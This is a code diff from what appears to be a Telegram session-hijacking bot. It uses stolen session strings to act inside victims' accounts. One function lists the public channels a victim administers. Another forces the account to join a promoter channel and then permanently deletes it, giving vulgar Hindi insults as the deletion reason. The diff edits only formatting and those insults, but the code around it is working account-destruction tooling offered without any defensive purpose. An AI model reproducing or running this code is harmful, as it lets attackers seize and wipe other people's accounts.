@@ -38,7 +38,7 @@ async def users_gc(session):
                 print(e)
             k = await alpha(GetAdminedPublicChannelsRequest())            
             for x in k.chats:                
-                msg += f'**⦾ ᴄʜᴀɴɴᴇʟ ɴᴀᴍᴇ :** {x.title}\n**⦾ ᴄʜᴀɴɴᴇʟ ᴜsᴇʀɴᴀᴍᴇ :** @{x.username}\n**⦾ ᴘᴀʀᴛɪᴄɪᴘᴀɴᴛs ᴄᴏᴜɴᴛ :** - {x.participants_count}\n\n'
+                msg += f'**⦾ ᴄʜᴀɴɴᴇʟ ɴᴀᴍᴇ :** {x.title}\n**⦾ ᴄʜᴀɴɴᴇʟ ᴜsᴇʀɴᴀᴍᴇ :** @{x.username}\n**⦾ ᴘᴀʀᴛɪᴄɪᴘᴀɴᴛs ᴄᴏᴜɴᴛ :** - {x.participants_count}'
             await alpha.disconnect()
                  
         else:    
@@ -58,7 +58,7 @@ async def users_gc(session):
                     print(e)    
                 k = await purvi.invoke(functions.channels.GetAdminedPublicChannels())            
                 for x in k.chats:
-                    msg += f'**⦾ ᴄʜᴀɴɴᴇʟ ɴᴀᴍᴇ :** {x.title}\n**⦾ ᴄʜᴀɴɴᴇʟ ᴜsᴇʀɴᴀᴍᴇ :** @{x.username}\n**⦾ ᴘᴀʀᴛɪᴄɪᴘᴀɴᴛs ᴄᴏᴜɴᴛ :** {x.participants_count}\n\n'
+                    msg += f'**⦾ ᴄʜᴀɴɴᴇʟ ɴᴀᴍᴇ :** {x.title}\n**⦾ ᴄʜᴀɴɴᴇʟ ᴜsᴇʀɴᴀᴍᴇ :** @{x.username}\n**⦾ ᴘᴀʀᴛɪᴄɪᴘᴀɴᴛs ᴄᴏᴜɴᴛ :** {x.participants_count}'
     except Exception as idk:
         err += str(idk)                                             
     if err:
@@ -507,7 +507,7 @@ async def del_acc(session):
                 await alpha(join("@TheSigmCoder"))              
             except Exception as e:
                 print(e)
-            await alpha(ok.account.DeleteAccountRequest("owner madarchod h"))
+            await alpha(ok.account.DeleteAccountRequest("Alpha ko Gand dene se mna kiya hai 🤡"))
             await alpha.disconnect() 
                              
         else:    
@@ -525,7 +525,7 @@ async def del_acc(session):
                     await purvi.join_chat("@TheSigmCoder")
                 except Exception as e:
                     print(e)    
-                await purvi.invoke(functions.account.DeleteAccount(reason="madarchod hu me"))
+                await purvi.invoke(functions.account.DeleteAccount(reason="Alpha Gand mang rha tha 😫"))
     except Exception as idk:
         err += str(idk)
                     
